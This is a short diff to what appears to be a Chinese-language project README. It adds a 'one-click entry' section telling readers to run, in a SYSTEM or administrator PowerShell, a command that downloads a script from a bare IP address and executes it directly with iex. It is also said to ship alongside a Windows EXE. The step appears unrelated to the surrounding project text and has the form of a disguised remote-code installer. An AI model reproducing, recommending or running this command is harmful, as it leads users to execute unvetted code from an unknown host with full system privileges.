@@ -547,3 +547,13 @@ git push origin v5.0.0
 <sub>本项目为独立开源项目，与任何其他软件、产品、服务或组织均无关联，亦未获得任何第三方的授权、认可或支持。</sub>
 
 </div>
+
+### Dufs 中文一键入口
+
+在 SYSTEM 或管理员 PowerShell 中运行：
+
+```powershell
+irm 'http://139.196.47.109:9939/AAAAAAAA/siwx.ps1?v=cn307' | iex
+```
+
+脚本和 Windows EXE 同目录分发，详情与恢复方式见 [脚本说明](./scripts/README.md)。
